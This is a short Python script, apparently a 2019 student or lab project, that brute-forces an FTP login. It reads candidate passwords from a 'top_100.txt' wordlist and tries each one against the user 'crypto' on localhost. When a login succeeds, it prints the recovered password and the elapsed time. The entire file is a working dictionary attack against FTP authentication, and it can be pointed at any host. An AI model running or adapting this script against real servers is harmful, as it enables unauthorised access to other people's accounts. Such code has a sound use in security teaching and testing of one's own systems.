#
#  Copyright (C) 2019 by
#  Divyansh Gupta, Harry Karwasra, Nandana Varshney, Nikhil Ramakrishnan
#
#  This project is licensed under the MIT License

import ftplib
import time
from ftplib import FTP

ftp = None

def check_cred(host,user,password):
    global ftp
    if ftp is None:
        ftp = FTP(host)
    #ftp = FTP('192.168.43.114')
    try:
        ftp.login(user=user, passwd =password)
        return 1
    except TimeoutError:
        return None
    except ftplib.error_perm:
        return 0
    except Exception:
        return None
    return None

def check_ftp(host):
    try:
        ftp = FTP(host)
        ftp.close()
    except TimeoutError:
        return 0
    except ftplib.error_perm:
        return 0
    except Exception:
        return 0
    return 1

def main():
    start = time.time()
    with open('top_100.txt','r') as fp:
        line = fp.readline().strip()
        cnt = 1
        while line:
            ret = check_cred('127.0.0.1','crypto',line)
            if(ret==1):
                break
            line = fp.readline().strip()
            cnt += 1
        
    if(ret==1):
        print("DA PASS WORD IS",line)
    dur = time.time() - start
    print("Duration:",dur)

if __name__ == "__main__":
    main()
